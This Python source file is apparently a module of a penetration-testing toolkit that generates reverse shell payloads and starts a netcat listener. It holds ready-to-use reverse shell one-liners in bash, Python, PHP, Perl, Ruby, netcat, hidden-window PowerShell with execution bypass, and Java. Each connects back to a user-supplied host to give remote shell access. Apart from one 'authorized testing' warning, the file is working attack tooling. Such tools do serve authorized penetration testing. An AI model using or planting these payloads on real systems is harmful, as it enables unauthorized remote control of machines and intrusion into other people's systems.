#!/usr/bin/env python3
"""
PENTRA-X Reverse Shell Generator
Generate reverse shell payloads for various languages.
"""

import os
from typing import Optional

from ...core.colors import Colors, success, error, info, warning, header
from ...core.utils import safe_input, safe_press_enter
from ...core.logging import get_logger, log_result


# Reverse shell templates
SHELL_TEMPLATES = {
    'bash': '''bash -i >& /dev/tcp/{ip}/{port} 0>&1''',
    
    'python': '''python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\'''',
    
    'php': '''php -r '$sock=fsockopen("{ip}",{port});exec("/bin/sh -i <&3 >&3 2>&3");\'''',
    
    'perl': '''perl -e 'use Socket;$i="{ip}";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};\'',
    
    'ruby': '''ruby -rsocket -e'f=TCPSocket.open("{ip}",{port}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\'''',
    
    'nc': '''nc -e /bin/sh {ip} {port}''',
    
    'nc_mkfifo': '''rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f''',
    
    'powershell': '''powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("{ip}",{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()''',
    
    'java': '''r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/{ip}/{port};cat <&5 | while read line; do \\$line 2>&5 >&5; done"] as String[])
p.waitFor()''',
}


def generate_reverse_shell() -> Optional[str]:
    """
    Generate reverse shell payload.
    
    Returns:
        Generated payload or None
    """
    logger = get_logger()
    
    header("Reverse Shell Generator")
    
    warning("Use only for authorized testing!")
    
    # Get LHOST and LPORT
    lhost = safe_input(f"{Colors.OKGREEN}Enter LHOST (your IP): {Colors.ENDC}")
    if not lhost:
        error("LHOST required")
        safe_press_enter()
        return None
    lhost = lhost.strip()
    
    lport = safe_input(f"{Colors.OKGREEN}Enter LPORT (default 4444): {Colors.ENDC}") or '4444'
    try:
        lport = int(lport.strip())
    except ValueError:
        lport = 4444
    
    # Select type
    print(f"\n{Colors.OKCYAN}Select shell type:{Colors.ENDC}")
    shells = list(SHELL_TEMPLATES.keys())
    for i, shell in enumerate(shells, 1):
        print(f"  {Colors.OKCYAN}{i}.{Colors.ENDC} {shell}")
    print(f"  {Colors.OKCYAN}0.{Colors.ENDC} All (generate all types)")
    
    choice = safe_input(f"\n{Colors.OKGREEN}Select type: {Colors.ENDC}")
    if choice is None:
        return None
    
    logger.tool_start("Reverse Shell Gen", f"{lhost}:{lport}")
    
    if choice == '0':
        # Generate all
        print(f"\n{Colors.OKCYAN}Generated Reverse Shells for {lhost}:{lport}{Colors.ENDC}")
        print("=" * 60)
        
        all_shells = []
        for shell_type, template in SHELL_TEMPLATES.items():
            payload = template.format(ip=lhost, port=lport)
            all_shells.append(f"# {shell_type}\n{payload}")
            
            print(f"\n{Colors.OKGREEN}[{shell_type.upper()}]{Colors.ENDC}")
            print(payload)
        
        print("=" * 60)
        
        # Save option
        save = safe_input(f"{Colors.OKGREEN}Save all to file? (y/N): {Colors.ENDC}")
        if save and save.lower() == 'y':
            filename = f"shells_{lhost}_{lport}.txt"
            with open(filename, 'w') as f:
                f.write('\n\n'.join(all_shells))
            success(f"Saved to {filename}")
        
        log_result("reverse_shell", f"Generated all shells for {lhost}:{lport}")
        logger.tool_end("Reverse Shell Gen", success=True)
        safe_press_enter()
        return all_shells[0]
    
    try:
        choice_idx = int(choice) - 1
        if 0 <= choice_idx < len(shells):
            shell_type = shells[choice_idx]
            template = SHELL_TEMPLATES[shell_type]
            payload = template.format(ip=lhost, port=lport)
            
            print(f"\n{Colors.OKCYAN}Generated {shell_type.upper()} Reverse Shell:{Colors.ENDC}")
            print("-" * 60)
            print(f"\n{Colors.OKGREEN}{payload}{Colors.ENDC}")
            print("-" * 60)
            
            # Listener command
            print(f"\n{Colors.OKCYAN}Start listener with:{Colors.ENDC}")
            print(f"  nc -lvnp {lport}")
            
            log_result("reverse_shell", f"{shell_type}: {payload}")
            logger.tool_end("Reverse Shell Gen", success=True)
            
            safe_press_enter()
            return payload
    except (ValueError, IndexError):
        pass
    
    error("Invalid selection")
    logger.tool_end("Reverse Shell Gen", success=False)
    safe_press_enter()
    return None


def start_listener(port: Optional[int] = None) -> None:
    """
    Start a netcat listener.
    
    Args:
        port: Port to listen on
    """
    header("Start Netcat Listener")
    
    if not port:
        port_input = safe_input(f"{Colors.OKGREEN}Enter port to listen on (default 4444): {Colors.ENDC}") or '4444'
        try:
            port = int(port_input.strip())
        except ValueError:
            port = 4444
    
    info(f"Starting listener on port {port}...")
    info("Press Ctrl+C to stop")
    
    import subprocess
    try:
        subprocess.run(['nc', '-lvnp', str(port)])
    except KeyboardInterrupt:
        info("Listener stopped")
    except FileNotFoundError:
        error("netcat (nc) not installed")
        info("Install with: sudo apt install netcat")
    
    safe_press_enter()


if __name__ == "__main__":
    generate_reverse_shell()
